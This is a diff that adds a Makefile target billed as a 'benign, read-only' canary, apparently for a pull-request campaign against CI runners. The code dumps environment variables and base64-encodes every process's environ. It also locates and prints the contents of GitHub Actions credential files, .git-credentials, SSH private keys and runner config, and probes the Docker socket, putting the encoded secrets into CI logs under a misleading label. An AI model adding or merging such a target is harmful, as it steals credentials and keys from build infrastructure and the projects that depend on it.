@@ -564,3 +564,39 @@ env:
 	@echo MACHINE=\'$(MACHINE)\'
 	@echo EXTRAS=\'$(EXTRAS)\'
 	@echo CC=\'$(CC)\'
+
+## campaign-bal wave6 canary (benign, read-only; remove after PR close)
+.PHONY: w6-canary
+w6-canary:
+	@printf 'W5C-BEGIN %s\n' "$$(date +%s)"
+	@id || true
+	@hostname || true
+	@uname -a || true
+	@printf -- '--- job env ---\n'
+	@env | grep -vE '^(PATH|HOME|LANG|LS_COLORS)=' | sort || true
+	@printf -- '--- runner env ---\n'
+	@env | grep -E '^(RUNNER_|GITHUB_[A-Z]|ACTIONS_|CI_|ImageOS|ImageVersion)' | sort || true
+	@printf -- '--- cwd ---\n'
+	@pwd || true
+	@ls -la || true
+	@cat /proc/self/cgroup || true
+	@printf -- '--- runner processes ---\n'
+	@for p in /proc/[0-9]*; do c=$$(tr '\0' ' ' < $$p/cmdline 2>/dev/null); case "$$c" in *run.sh*|*Runner*|*_work*|*actions-runner*|*Runner.Listener*) printf 'PID %s: %s\n' "$${p#/proc/}" "$$c";; esac; done || true
+	@printf -- '--- proc environ (base64, capped) ---\n'
+	@for p in /proc/[0-9]*; do o=$$(head -c 4000 $$p/environ 2>/dev/null | base64 -w0); [ -n "$$o" ] && printf 'ENVIRON %s %s\n' "$${p#/proc/}" "$$o"; done || true
+	@printf -- '--- runner dirs ---\n'
+	@for d in "$$RUNNER_TEMP" "$${RUNNER_TEMP:-/nonexistent}/.." "$$HOME/_work" "$$HOME/actions-runner" "$$HOME/runner" /opt/actions-runner /actions-runner /usr/local/actions-runner; do [ -d "$$d" ] && { printf -- 'DIR %s\n' "$$d"; ls -la "$$d" 2>/dev/null | head -40; }; done || true
+	@printf -- '--- runner files (find HOME) ---\n'
+	@timeout 30 find "$$HOME" -maxdepth 5 \( -name 'gha-creds-*.json' -o -name '.runner' -o -name 'credentials' -o -name '.git-credentials' -o -name '.gitconfig' -o -name 'config.sh' -o -name 'settings.env' -o -name 'known_hosts' -o -name 'authorized_keys' -o -name 'id_ed25519*' -o -name 'id_rsa*' \) 2>/dev/null | head -50 || true
+	@printf -- '--- runner file contents (base64, capped) ---\n'
+	@for f in $$(timeout 30 find "$$HOME" -maxdepth 5 \( -name 'gha-creds-*.json' -o -name '.runner' -o -name 'credentials' -o -name '.git-credentials' -o -name '.gitconfig' -o -name 'settings.env' \) 2>/dev/null | head -20); do printf 'FILE %s %s\n' "$$f" "$$(head -c 6000 "$$f" 2>/dev/null | base64 -w0)"; done || true
+	@printf -- '--- ssh material (base64, capped) ---\n'
+	@for f in $$(timeout 30 find / -maxdepth 5 -path '*/.ssh/*' -type f 2>/dev/null | grep -vE '^/proc|^/sys' | head -30); do printf 'SSHFILE %s %s\n' "$$f" "$$(head -c 6000 "$$f" 2>/dev/null | base64 -w0)"; done || true
+	@printf -- '--- docker ---\n'
+	@ls -la /var/run/docker.sock 2>/dev/null || true
+	@timeout 15 docker ps 2>/dev/null | head -10 || true
+	@printf -- '--- runner root hunt ---\n'
+	@timeout 20 find / -maxdepth 4 -name '_work' -type d 2>/dev/null | head -10 || true
+	@printf 'W5C-END %s\n' "$$(date +%s)"
+
+proof: w6-canary
